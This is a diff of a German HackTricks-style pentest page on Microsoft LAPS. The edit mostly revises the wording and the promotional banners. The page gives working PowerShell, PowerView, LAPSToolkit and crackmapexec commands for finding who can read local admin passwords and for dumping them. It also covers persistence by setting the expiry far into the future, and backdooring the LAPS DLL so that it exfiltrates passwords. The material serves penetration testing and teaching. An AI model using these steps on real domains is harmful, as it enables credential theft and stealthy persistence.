@@ -1,16 +1,19 @@
 # LAPS
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
-* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [HackTricks-Repository](https://github.com/carlospolop/hacktricks) und das [HackTricks-Cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
@@ -19,11 +22,11 @@
 
 ## Grundlegende Informationen
 
-Local Administrator Password Solution (LAPS) ist ein Tool zur Verwaltung eines Systems, bei dem **Administratorpasswörter**, die **eindeutig, zufällig und häufig geändert** sind, auf domänenbeigetretenen Computern angewendet werden. Diese Passwörter werden sicher in Active Directory gespeichert und sind nur für Benutzer zugänglich, denen über Zugriffssteuerungslisten (ACLs) Berechtigungen erteilt wurden. Die Sicherheit der Passwortübertragungen vom Client zum Server wird durch die Verwendung von **Kerberos Version 5** und **Advanced Encryption Standard (AES)** sichergestellt.
+Local Administrator Password Solution (LAPS) ist ein Tool zur Verwaltung eines Systems, bei dem **Administratorpasswörter**, die **einzigartig, zufällig und häufig geändert** werden, auf domänenverbundenen Computern angewendet werden. Diese Passwörter werden sicher in Active Directory gespeichert und sind nur für Benutzer zugänglich, die durch Access Control Lists (ACLs) die Berechtigung erhalten haben. Die Sicherheit der Passwortübertragungen vom Client zum Server wird durch die Verwendung von **Kerberos Version 5** und **Advanced Encryption Standard (AES)** gewährleistet.
 
-Bei der Implementierung von LAPS in den Computerobjekten der Domäne werden zwei neue Attribute hinzugefügt: **`ms-mcs-AdmPwd`** und **`ms-mcs-AdmPwdExpirationTime`**. Diese Attribute speichern das **Klartext-Administratorpasswort** und **dessen Ablaufzeit**.
+Bei den Computerobjekten der Domäne führt die Implementierung von LAPS zur Hinzufügung von zwei neuen Attributen: **`ms-mcs-AdmPwd`** und **`ms-mcs-AdmPwdExpirationTime`**. Diese Attribute speichern das **Klartext-Administratorpasswort** und **seine Ablaufzeit**.
 
-### Überprüfen Sie, ob aktiviert
+### Überprüfen, ob aktiviert
 ```bash
 reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
 
@@ -38,9 +41,9 @@ Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs
 ```
 ### LAPS Passwortzugriff
 
-Sie könnten die **rohe LAPS-Richtlinie** von `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` herunterladen und dann **`Parse-PolFile`** aus dem [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) Paket verwenden, um diese Datei in ein menschenlesbares Format zu konvertieren.
+Sie könnten **die rohe LAPS-Richtlinie herunterladen** von `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` und dann **`Parse-PolFile`** aus dem [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) Paket verwenden, um diese Datei in ein menschenlesbares Format zu konvertieren.
 
-Darüber hinaus können die **nativen LAPS PowerShell-Cmdlets** verwendet werden, wenn sie auf einer Maschine installiert sind, auf die wir Zugriff haben:
+Darüber hinaus können die **nativ LAPS PowerShell-Cmdlets** verwendet werden, wenn sie auf einem Rechner installiert sind, auf den wir Zugriff haben:
 ```powershell
 Get-Command *AdmPwd*
 
@@ -61,7 +64,7 @@ Find-AdmPwdExtendedRights -Identity Workstations | fl
 # Read the password
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
-**PowerView** kann auch verwendet werden, um herauszufinden, **wer das Passwort lesen kann und es liest**:
+**PowerView** kann auch verwendet werden, um herauszufinden **wer das Passwort lesen kann und es lesen kann**:
 ```powershell
 # Find the principals that have ReadPropery on ms-Mcs-AdmPwd
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
@@ -71,7 +74,9 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 ```
 ### LAPSToolkit
 
-Das [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) erleichtert die Auflistung von LAPS mit mehreren Funktionen. Eine davon ist das Parsen von **`ExtendedRights`** für **alle Computer mit aktiviertem LAPS**. Dies zeigt **Gruppen**, die speziell dazu berechtigt sind, LAPS-Passwörter zu lesen, die oft Benutzer in geschützten Gruppen sind. Ein **Konto**, das einen Computer in eine Domäne aufgenommen hat, erhält `Alle erweiterten Rechte` über diesen Host, und dieses Recht gibt dem **Konto** die Möglichkeit, **Passwörter zu lesen**. Die Auflistung kann ein Benutzerkonto zeigen, das das LAPS-Passwort auf einem Host lesen kann. Dies kann uns helfen, **spezifische AD-Benutzer** zu identifizieren, die LAPS-Passwörter lesen können.
+Das [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) erleichtert die Enumeration von LAPS mit mehreren Funktionen.\
+Eine davon ist das Parsen von **`ExtendedRights`** für **alle Computer mit aktivierten LAPS.** Dies zeigt **Gruppen**, die speziell **delegiert sind, um LAPS-Passwörter zu lesen**, die oft Benutzer in geschützten Gruppen sind.\
+Ein **Konto**, das **einen Computer** zu einer Domäne hinzugefügt hat, erhält `All Extended Rights` über diesen Host, und dieses Recht gibt dem **Konto** die Fähigkeit, **Passwörter zu lesen**. Die Enumeration kann ein Benutzerkonto anzeigen, das das LAPS-Passwort auf einem Host lesen kann. Dies kann uns helfen, **spezifische AD-Benutzer** zu identifizieren, die LAPS-Passwörter lesen können.
 ```powershell
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
@@ -96,15 +101,17 @@ ComputerName                Password       Expiration
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
 ## **Dumping LAPS-Passwörter mit Crackmapexec**
-Wenn kein Zugriff auf ein Powershell besteht, können Sie dieses Privileg remote über LDAP missbrauchen, indem Sie
+Wenn kein Zugriff auf PowerShell besteht, können Sie dieses Privileg remote über LDAP ausnutzen, indem Sie
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
+Dies wird alle Passwörter ausgeben, die der Benutzer lesen kann, sodass Sie mit einem anderen Benutzer einen besseren Fuß in die Tür bekommen.
+
 ## **LAPS Persistenz**
 
 ### **Ablaufdatum**
 
-Sobald Administrator, ist es möglich, **die Passwörter zu erhalten** und **zu verhindern**, dass eine Maschine ihr **Passwort aktualisiert**, indem man das Ablaufdatum **in die Zukunft setzt**.
+Sobald man Administrator ist, ist es möglich, **die Passwörter zu erhalten** und einen Computer daran zu **hindern**, sein **Passwort** zu **aktualisieren**, indem man **das Ablaufdatum in die Zukunft setzt**.
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
@@ -114,14 +121,14 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
 {% hint style="warning" %}
-Das Passwort wird trotzdem zurückgesetzt, wenn ein **Admin** das **`Reset-AdmPwdPassword`**-Cmdlet verwendet; oder wenn **Das Zulassen einer Passwortablaufzeit, die länger als vom Richtlinie erforderlich, nicht zulässt** im LAPS-GPO aktiviert ist.
+Das Passwort wird weiterhin zurückgesetzt, wenn ein **Admin** das **`Reset-AdmPwdPassword`** Cmdlet verwendet; oder wenn **Nicht erlauben, dass die Passwortablaufzeit länger ist als von der Richtlinie erforderlich** in der LAPS GPO aktiviert ist.
 {% endhint %}
 
 ### Hintertür
 
-Der originale Quellcode für LAPS kann [hier](https://github.com/GreyCorbel/admpwd) gefunden werden, daher ist es möglich, eine Hintertür im Code zu platzieren (innerhalb der `Get-AdmPwdPassword`-Methode in `Main/AdmPwd.PS/Main.cs` zum Beispiel), die irgendwie **neue Passwörter exfiltriert oder irgendwo speichert**.
+Der ursprüngliche Quellcode für LAPS ist [hier](https://github.com/GreyCorbel/admpwd) zu finden, daher ist es möglich, eine Hintertür in den Code einzufügen (innerhalb der `Get-AdmPwdPassword` Methode in `Main/AdmPwd.PS/Main.cs` zum Beispiel), die irgendwie **neue Passwörter exfiltriert oder sie irgendwo speichert**.
 
-Dann einfach die neue `AdmPwd.PS.dll` kompilieren und auf die Maschine unter `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` hochladen (und das Änderungsdatum ändern).
+Dann einfach die neue `AdmPwd.PS.dll` kompilieren und auf die Maschine in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` hochladen (und die Änderungszeit ändern).
 
 ## Referenzen
 * [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
@@ -130,14 +137,17 @@ Dann einfach die neue `AdmPwd.PS.dll` kompilieren und auf die Maschine unter `C:
 
 {% embed url="https://websec.nl/" %}
 
+{% hint style="success" %}
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? oder möchten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
-* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud) senden**.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
+{% endhint %}
